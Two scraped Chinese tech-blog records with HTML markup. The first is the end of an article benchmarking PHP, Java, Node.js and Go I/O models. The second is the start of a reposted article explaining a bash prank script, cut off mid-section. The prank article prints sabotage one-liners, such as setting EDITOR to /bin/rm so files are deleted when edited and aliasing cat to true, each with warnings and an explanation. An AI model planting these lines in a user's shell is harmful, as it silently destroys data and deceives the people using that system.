title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">JavaScript</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nfunc ServeHTTP(w http.ResponseWriter, r *http.Request) {\r\n\r\n    // 这里底层的网络调用是非阻塞的\r\n    rows, err := db.Query(\"SELECT ...\")\r\n\r\n    for _, row := range rows {\r\n        // 处理rows\r\n        // 每个请求在它自己的goroutine中\r\n    }\r\n\r\n    w.Write(...) // 输出响应结果，也是非阻塞的\r\n\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc78399384507-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc78399384507-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc78399384507-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc78399384507-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc78399384507-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc78399384507-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc78399384507-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc78399384507-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc78399384507-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc78399384507-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc78399384507-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd525ccc78399384507-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd525ccc78399384507-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd525ccc78399384507-1\"><span class=\"crayon-e\">func </span><span class=\"crayon-e\">ServeHTTP</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">w</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">http</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ResponseWriter</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">http</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Request</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc78399384507-2\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc78399384507-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 这里底层的网络调用是非阻塞的</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc78399384507-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">err</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Query</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"SELECT ...\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc78399384507-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc78399384507-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">_</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">row</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">range</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rows</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc78399384507-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 处理rows</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc78399384507-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 每个请求在它自己的goroutine中</span></div><div class=\"crayon-line\" id=\"crayon-594bd525ccc78399384507-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc78399384507-10\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc78399384507-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">w</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Write</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 输出响应结果，也是非阻塞的</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd525ccc78399384507-12\"> </div><div class=\"crayon-line\" id=\"crayon-594bd525ccc78399384507-13\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>正如你在上面见到的，我们的基本代码结构像是更简单的方式，并且在背后实现了非阻塞I/O。</p>\n<p>在大多数情况下，这最终是“两个世界中最好的”。非阻塞I/O用于全部重要的事情，但是你的代码看起来像是阻塞，因此往往更容易理解和维护。Go调度器和OS调度器之间的交互处理了剩下的部分。这不是完整的魔法，如果你建立的是一个大型的系统，那么花更多的时间去理解它工作原理的更多细节是值得的; 但与此同时，“开箱即用”的环境可以很好地工作和很好地进行扩展。</p>\n<p>Go可能有它的缺点，但一般来说，它处理I/O的方式不在其中。</p>\n<h2 id=\"\">谎言，诅咒的谎言和基准</h2>\n<p>对这些各种模式的上下文切换进行准确的定时是很困难的。也可以说这对你来没有太大作用。所以取而代之，我会给出一些比较这些服务器环境的HTTP服务器性能的基准。请记住，整个端对端的HTTP请求/响应路径的性能与很多因素有关，而这里我放在一起所提供的数据只是一些样本，以便可以进行基本的比较。</p>\n<p>对于这些环境中的每一个，我编写了适当的代码以随机字节读取一个64k大小的文件，运行一个SHA-256哈希N次（N在URL的查询字符串中指定，例如<code>.../test.php?n=100</code>），并以十六进制形式打印生成的散列。我选择了这个示例，是因为使用一些一致的I/O和一个受控的方式增加CPU使用率来运行相同的基准测试是一个非常简单的方式。</p>\n<p>关于环境使用，更多细节请参考<a href=\"https://peabody.io/post/server-env-benchmarks/\">这些基准要点</a>。</p>\n<p>首先，来看一些低并发的例子。运行2000次迭代，并发300个请求，并且每次请求只做一次散列（N = 1），可以得到：<br>\n<img class=\"aligncenter\" src=\"http://7xslqv.com1.z0.glb.clouddn.com/images/b/9f/a90935e5892036d8e30b4950ed448.jpg\" alt=\"\"></p>\n<blockquote><p>时间是在全部并发请求中完成请求的平均毫秒数。越低越好。</p></blockquote>\n<p>很难从一个图表就得出结论，但对于我来说，似乎与连接和计算量这些方面有关，我们看到时间更多地与语言本身的一般执行有关，因此更多在于I/O。请注意，被认为是“脚本语言”（输入随意，动态解释）的语言执行速度最慢。</p>\n<p>但是如果将N增加到1000，仍然并发300个请求，会发生什么呢 —— 相同的负载，但是hash迭代是之前的100倍（显着增加了CPU负载）：<br>\n<img class=\"aligncenter\" src=\"http://7xslqv.com1.z0.glb.clouddn.com/images/e/80/8d736ed165a362c8ad101a9486fe5.jpg\" alt=\"\"></p>\n<blockquote><p>时间是在全部并发请求中完成请求的平均毫秒数。越低越好。</p></blockquote>\n<p>忽然之间，Node的性能显着下降了，因为每个请求中的CPU密集型操作都相互阻塞了。有趣的是，在这个测试中，PHP的性能要好得多（相对于其他的语言），并且打败了Java。（值得注意的是，在PHP中，SHA-256实现是用C编写的，执行路径在这个循环中花费更多的时间，因为这次我们进行了1000次哈希迭代）。</p>\n<p>现在让我们尝试5000个并发连接（并且N = 1）—— 或者接近于此。不幸的是，对于这些环境的大多数，失败率并不明显。对于这个图表，我们会关注每秒的请求总数。<em>越高越好</em>：</p>\n<p><img class=\"aligncenter\" src=\"http://7xslqv.com1.z0.glb.clouddn.com/images/5/27/f9a22d54c1d30738d7cd3fe41e415.jpg\" alt=\"\"></p>\n<blockquote><p>每秒的请求总数。越高越好。</p></blockquote>\n<p>这张照片看起来截然不同。这是一个猜测，但是看起来像是对于高连接量，每次连接的开销与产生新进程有关，而与PHP + Apache相关联的额外内存似乎成为主要的因素并制约了PHP的性能。<strong>显然，Go是这里的冠军，其次是Java和Node，最后是PHP</strong>。</p>\n<h2 id=\"\">结论</h2>\n<p>综上所述，很显然，随着语言的演进，处理大量I/O的大型应用程序的解决方案也随之不断演进。</p>\n<p>为了公平起见，暂且抛开本文的描述，PHP和Java确实有可用于Web应用程序的非阻塞I/O的实现。 但是这些方法并不像上述方法那么常见，并且需要考虑使用这种方法来维护服务器的伴随的操作开销。更不用说你的代码必须以与这些环境相适应的方式进行结构化; “正常”的PHP或Java Web应用程序通常不会在这样的环境中进行重大改动。</p>\n<p>作为比较，如果只考虑影响性能和易用性的几个重要因素，可以得到：</p>\n<p>语言线程或进程非阻塞I/O易用性</p>\n<table>\n<thead></thead>\n<tbody>\n<tr>\n<td>PHP</td>\n<td>进程</td>\n<td>否</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Java</td>\n<td>线程</td>\n<td>可用</td>\n<td></td>\n<td>需要回调</td>\n</tr>\n<tr>\n<td>Node.js</td>\n<td>线程</td>\n<td>是</td>\n<td></td>\n<td>需要回调</td>\n</tr>\n<tr>\n<td>Go</td>\n<td>线程（Goroutine）</td>\n<td>是</td>\n<td></td>\n<td>不需要回调</td>\n</tr>\n</tbody>\n</table>\n<p>线程通常要比进程有更高的内存效率，因为它们共享相同的内存空间，而进程则没有。结合与非阻塞I/O相关的因素，当我们向下移动列表到一般的启动时，因为它与改善I/O有关，可以看到至少与上面考虑的因素一样。如果我不得不在上面的比赛中选出一个冠军，那肯定会是Go。</p>\n<p>即便这样，在实践中，选择构建应用程序的环境与你的团队对于所述环境的熟悉程度以及可以实现的总体生产力密切相关。因此，每个团队只是一味地扎进去并开始用Node或Go开发Web应用程序和服务可能没有意义。事实上，寻找开发人员或内部团队的熟悉度通常被认为是不使用不同的语言和/或不同的环境的主要原因。也就是说，过去的十五年来，时代已经发生了巨大的变化。</p>\n<p>希望以上内容可以帮助你更清楚地了解幕后所发生的事件，并就如何处理应用程序现实世界中的可扩展性为你提供的一些想法。快乐输入，快乐输出！</p>\n</section>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111439\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111439votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111439\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://7xslqv.com1.z0.glb.clouddn.com/images/8/81/62414141f3b3627e6f8dacbea29f0.jpg"], "fav_nums": 6, "comment_nums": 1, "create_date": "2017/06/12", "praise_nums": 3}
{"tags": " 2 评论 ,Bash,IT技术,shell", "front_image_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg", "title": "我是见鬼了么？这是史上最邪恶的脚本！没有之一！", "url_object_id": "6af92cd36c71c3667ed7345bce410262", "url": "http://blog.jobbole.com/111312/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://linux.cn/article-8544-1.html\">Linux中国</a>   </div><p>昨天，微博上的朋友 <a href=\"http://weibo.com/3404002352\">@马甲与小号</a> 告诉我发现了一个奇怪的东西，本着好奇心使人进步（害死猫？）的目的，我去观摩了一番，于是就有了今天这篇文章。</p>\n<div id=\"article_content\">\n<p>这是一个 bash shell 脚本，其中有若干可以整蛊（结仇）你的同事的小技巧——或者说恶作剧。看完之后，感觉不寒而栗，要是谁敢这样整我，我一定和他绝交！</p>\n<blockquote><p><strong>警告，切勿在生产环境体验，一切后果脚本作者和本文作者均不不承担！</strong></p>\n<p><strong>警告，切勿在生产环境体验，一切后果脚本作者和本文作者均不不承担！</strong></p>\n<p><strong>警告，切勿在生产环境体验，一切后果脚本作者和本文作者均不不承担！</strong></p></blockquote>\n<h3 id=\"toc_1\">这个世界怎么了？</h3>\n<p>这个脚本主要由一些别名、函数、环境变量定义组织而成，执行该脚本后，你的 shell 环境就变成了一个光怪陆离的世界。</p>\n<p>好了，那么我们来看看都发生了什么。</p>\n<p>注：本脚本适用于 bash 环境，其它 shell 环境有些不支持。</p>\n<h4 id=\"toc_2\">可怕的默认编辑器</h4>\n<p>当系统调用默认编辑器来编辑比如 crontab 时，biu 的一下，文件没了！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b376645610902\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nexport EDITOR=/bin/rm;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b376645610902-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b376645610902-1\"><span class=\"crayon-e\">export </span><span class=\"crayon-v\">EDITOR</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">rm</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这是将 <code>EDITOR</code> 环境变量定义为 <code>rm</code>，而它原本应该是 <code>vi</code>、<code>emacs</code> 或 <code>nano</code> 的，体会一下，是不是很酸爽？</p>\n<blockquote><p>学习课堂：</p>\n<p><code>EDITOR</code> 环境变量用于定于系统的默认编辑器，在一些系统内置功能里面，比如编辑 crontab 时，会根据该变量调用默认编辑器。</p></blockquote>\n<h4 id=\"toc_3\">猥琐的制表符（tab）</h4>\n<p>当你想用制表符来个自动补全时，你会它非但不干，而且还删除了一个字母，不信邪的你使劲多砸了几个制表符，这下好了，更多的字符被删除了。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b37f463412658\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntset -Qe $'\\t';</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b37f463412658-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b37f463412658-1\"><span class=\"crayon-v\">tset</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Qe</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-s\">'\\t'</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>原来是将制表符定义为退格键了。</p>\n<blockquote><p>学习课堂：</p>\n<p><code>tset</code> 用于设置终端特征；<code>-e</code> 参数设置擦除字符，缺省为退格字符；<code>-Q</code> 表示不显示设置信息（静默）。</p></blockquote>\n<h4 id=\"toc_4\">莫名退出</h4>\n<p>有时候，执行一个命令就会莫名其妙地退出 shell，只不过是命令有个非 0 的返回状态嘛，为什么会这样？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b384498076923\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n((RANDOM % 10)) || set -o errexit;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b384498076923-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b384498076923-1\"><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">RANDOM</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">errexit</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p></p>\n<blockquote><p>学习课堂：</p>\n<p><code>set -o errexit</code> 等价于 <code>set -e</code>，表示有任何错误（命令的返回状态非 0 ）时即退出。</p></blockquote>\n<h4 id=\"toc_5\">啥都看（cat）不了</h4>\n<p>当我想看（<code>cat</code>）一下文件时，它居然就当没听见，到底文件里面有啥啊？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b387006070123\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias cat=true;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b10e03b387006070123-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b10e03b387006070123-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">cat</span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>原来是把 <code>cat</code> 定义成 <code>true</code> 命令的别名了， <code>true</code> 命令啥都不干，不管你给它什么参数和什么输入，它只是静静地返回一个 <code>0</code> 的状态码。</p>\n<blockquote><p>学习课堂</p>\n<p><code>true</code> 命令和 <code>false</code> 命令常用于 shell 脚本中。</p></blockquote>\n<h4 id=\"toc_6\">到底是按什么排列的啊？</h4>\n<p>好吧，我想看看目录里面有啥文件，于是我输入了 <code>ls</code>，咦？这是什么顺序？我再次输入一遍，怎么回事，列出的文件和目录又是一种顺序，难道它的输出看心情吗？</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b10e03b38b312991053\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div 